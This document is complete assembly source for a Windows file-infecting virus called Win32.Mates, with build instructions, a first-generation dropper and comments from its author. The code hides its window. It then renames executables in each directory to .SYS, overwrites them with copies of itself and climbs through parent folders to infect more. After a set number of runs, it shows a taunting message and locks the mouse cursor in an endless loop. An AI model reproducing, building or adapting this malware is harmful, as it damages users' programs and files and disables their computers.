COMMENT#

____________________________________________________________________________________________
                              ...:: Win32.Mates - Virus ::...
                                      - Version 1.0 -
                                    - by  DiA /auXnet -
                                    - (c)02 [GermanY] -
____________________________________________________________________________________________


+++++Disclaimer+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+I am NOT responsible for any damage that you do! You can need the code however you want...+
+My motherlanguage is not English, I hope you understand what I mean.                      +
+Feel FREE to write any Comments to                                                        +
+                                       DiA_hates_machine@gmx.de                           +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


Why the Hell "Mates":
 This Virus is written for all my Mates in real life!


How does it work:
 - get da real host's name (.SYS)
 - create a thread (Virus)
 - run Host
Virus->
 - start after five sek
 - rename found .EXE file to .SYS
 - copy itself in .EXE file
 - if no more filez in current directory -> cd.. (with my method)
 - infect again
 - when no more fileZ check counter
 - if no payload give full control to host


Payload:
 - new counter method (via Get/Set CaretBlinkTime)
 - set new caret blink time
 - inc it
 - 20 starts of da host???
 - if yes set new caret blink time (-20) stop the mouse cursor and show a message
 - if no inc it again and back to host


Special:
 - the counter
 - hide da fucking window (with TASM32)
 - work with threads


Here comes da 1st geneartion:

;-----MatesSys.asm-----cut------------------------------------------------------------------
.386
.model flat
jumps

extrn MessageBoxA:PROC
extrn ExitProcess:PROC

.data
oTitle	db '°°°1st Generation°°°',0
oMsg	db 'This is da 1st generation of Win32.Mates - Virus',10,13
	db '        by  DiA /auXnet',10,13
	db 'Have Fun...',0

.code
start:

push 0
push offset oTitle
push offset oMsg
push 0
call MessageBoxA

push 0
call ExitProcess

end start
;---------------------cut-------------------------------------------------------------------


To Compile the Mates - ViruS:
 
 tasm32 /z /ml /m3 Mates,,;
 tlink32 -Tpe -c Mates,Mates,, import32.lib


To Compile the Mates - SYS:

 tasm32 /z /ml /m3 MatesSys,,;
 tlink32 -Tpe -c MatesSys,MatesSys,, import32.lib
 rename MatesSys.exe Mates.sys

#
;-------------------------------------------------------------------------------------------



.386
.model flat
jumps


;-----needed API's--------------------------------------------------------------------------
extrn MessageBoxA		:PROC
extrn SetConsoleTitleA		:PROC
extrn SetCursorPos		:PROC
extrn SetCaretBlinkTime		:PROC
extrn SetWindowPos		:PROC
extrn SetCurrentDirectoryA	:PROC
extrn Sleep			:PROC
extrn FindWindowA		:PROC
extrn FindFirstFileA		:PROC
extrn FindNextFileA		:PROC
extrn CreateThread		:PROC
extrn CloseHandle		:PROC
extrn CopyFileA			:PROC
extrn CreateProcessA		:PROC
extrn GetCommandLineA		:PROC
extrn GetCaretBlinkTime		:PROC
extrn lstrcpyA			:PROC
extrn ExitProcess		:PROC
;-------------------------------------------------------------------------------------------


;-----data's for the Virus------------------------------------------------------------------
.data
oTitle			db '[Win32.Mates  Version 1.0]',0
oMsg			db 'I WANNA SAY HELLO TO SOME MATES:',10,13
			db '  o DeathRider - Colorado SuckZ, Bitch ;)',10,13
			db '  o Herr H.    - Smoke together!',10,13
			db '  o Danny      - Rock ''n Roll',10,13
			db '  o Pascal     - I need some weed...',10,13
			db 'AND ALL THE OTHER FUCKERZ :)',10,13
			db 'Ride On and THANX for all',10,13,10,13
			db '                   greetz DiA /auXnet',0 
MyConsoleTitle		db '.:.',0
FileMask		db '*.EXE',0
WindowHandle		dd 0
ThreadHandle		dd 0
ThreadID		dd 0
FindHandle		dd 0
ProcessInfo		dd 4 dup (0)
StartupInfo		dd 4 dup (0)
Win32FindData		dd 0,0,0,0,0,0,0,0,0,0,0
TargetFile		db 200d dup (0)
CreateFile		db 200d dup (0)
VirusFile		db 200d dup (0)
HostFile		db 200d dup (0)
Directory		db 200d dup (0)
;-------------------------------------------------------------------------------------------



;-----Rock 'n Roll--------------------------------------------------------------------------
.code
Mates:
;-------------------------------------------------------------------------------------------


;-----hide da window------------------------------------------------------------------------
mov eax,offset MyConsoleTitle
push eax
call SetConsoleTitleA

call Sleep5					;it suckz without sleep

mov eax,offset MyConsoleTitle
xor ebx,ebx
push eax
push ebx
call FindWindowA
mov dword ptr [WindowHandle],eax

call Sleep5

mov eax,01
xor ebx,ebx
mov edx,20000
push ebx
push eax
push eax
push edx
push edx
push ebx
push dword ptr [WindowHandle]
call SetWindowPos
;-------------------------------------------------------------------------------------------


;-----create a thread (virus)---------------------------------------------------------------
mov eax,offset ThreadID
xor ecx,ecx
mov edx,offset RunMates
call MakeThread
;-------------------------------------------------------------------------------------------


;-----get hostname (.sys) and run it--------------------------------------------------------
call GetCommandLineA				;via command line

mov edx,offset VirusFile
push eax
push edx
call lstrcpyA

mov esi,offset VirusFile			;fuck da "
call GetPoint

add esi,4d
mov dword ptr [esi],00000000h

push offset VirusFile+1
push offset HostFile
call lstrcpyA

mov esi,offset HostFile
call GetPoint

mov dword ptr [esi],5359532Eh			;rename to .SYS

mov eax,offset ProcessInfo
xor ebx,ebx
mov ecx,10h
mov edx,offset StartupInfo
mov edi,offset HostFile
push eax					;run host
push edx
push ebx
push ebx
push ecx
push ebx
push ebx
push ebx
push edi
push edi
call CreateProcessA

Wait4Mates:
jmp Wait4Mates					;wait for da virus
;-------------------------------------------------------------------------------------------




;-----here startz da virus (after 5sek)-----------------------------------------------------
RunMates:
mov eax,5000
push eax					;wait 5sek before run
call Sleep
;-------------------------------------------------------------------------------------------


;-----cd.. with another method--------------------------------------------------------------
mov eax,offset HostFile
mov edx,offset Directory
push offset eax					;copy host name 2 directory
push offset edx
call lstrcpyA

mov esi,offset Directory
call GetPoint

mov edi,esi					;handle it in edi
mov dword ptr [edi],00000000h			;fuck da point

DotDot:						;it workz!
cmp byte ptr [edi],'\'
jz ClearAndSet
cmp byte ptr [edi],':'				;C:\ -> cd.. -> suckz
jz CheckBlink
dec edi
jmp DotDot

ClearAndSet:
inc edi
mov dword ptr [edi],00000000h
sub edi,2

mov eax,offset Directory
push eax
call SetCurrentDirectoryA
;-------------------------------------------------------------------------------------------


;-----infect some filez---------------------------------------------------------------------
mov eax,offset Win32FindData
mov edx,offset FileMask
push eax
push edx
call FindFirstFileA
mov dword ptr [FindHandle],eax

FindNext:
cmp eax,-1					;error -> cd..
je DotDot
test eax,eax					;no more filez -> cd..
jz DotDot

mov eax,offset TargetFile
mov edx,offset CreateFile
push eax
push edx
call lstrcpyA

mov esi,offset CreateFile
call GetPoint

mov dword ptr [esi],5359532Eh			;rename to .SYS

mov eax,offset CreateFile
mov edx,offset TargetFile
mov ecx,01
call CopyIt

mov eax,offset TargetFile
mov edx,offset VirusFile+1
xor ecx,ecx
call CopyIt

mov eax,offset Win32FindData
push eax					;search more filez
push dword ptr [FindHandle]
call FindNextFileA
jmp FindNext 
;-------------------------------------------------------------------------------------------


;-----the funny part ...the payload---------------------------------------------------------
CheckBlink:
call GetCaretBlinkTime				;kewl counter!
mov esi,eax					;handle it in esi

cmp esi,1520
ja Set1499					;bigger

cmp esi,1500
jb Set1501					;smaler than 1500 mil sek

GoOn:
cmp esi,1519
jne exit					;exit when not 1519

inc esi
call SetBlink					;inc da counter

mov eax,offset ThreadID
xor ecx,ecx
mov edx,offset Message
call MakeThread					;show a nice message

CursorSleep:					;fuck da cursor
mov eax,666
mov edx,999
push eax
push edx
call SetCursorPos
jmp CursorSleep					;foreva ;)

exit:
inc esi
call SetBlink					;inc da counter

xor eax,eax					;null
push eax
call ExitProcess				;give full control to host

Set1501:
mov esi,1501
call SetBlink
jmp GoOn

Set1499:
mov esi,1499					;go from start
call SetBlink
jmp exit

ret						;thraedend
;-------------------------------------------------------------------------------------------


;-----Sleep5 procedure----------------------------------------------------------------------
Sleep5:
mov eax,05
push eax
call Sleep
ret
;-------------------------------------------------------------------------------------------


;-----GetPoint procedure--------------------------------------------------------------------
GetPoint:
cmp byte ptr [esi],'.'
jz PointFound
inc esi
jmp GetPoint
PointFound:
ret
;-------------------------------------------------------------------------------------------


;-----MakeThread procedure------------------------------------------------------------------
MakeThread:
push eax
push ecx
push ecx
push edx
push ecx
push ecx
call CreateThread
mov dword ptr [ThreadHandle],eax

push dword ptr [ThreadHandle]
call CloseHandle
ret
;-------------------------------------------------------------------------------------------


;-----Message Thread------------------------------------------------------------------------
Message:
mov eax,offset oTitle
mov edx,offset oMsg
xor ebx,ebx
push ebx
push eax
push edx
push ebx
call MessageBoxA
ret
;-------------------------------------------------------------------------------------------


;-----CopyIt procedure----------------------------------------------------------------------
CopyIt:
push ecx
push eax
push edx
call CopyFileA
ret
;-------------------------------------------------------------------------------------------


;-----SetBlink procedure--------------------------------------------------------------------
SetBlink:
push esi
call SetCaretBlinkTime
ret
;-------------------------------------------------------------------------------------------

end Mates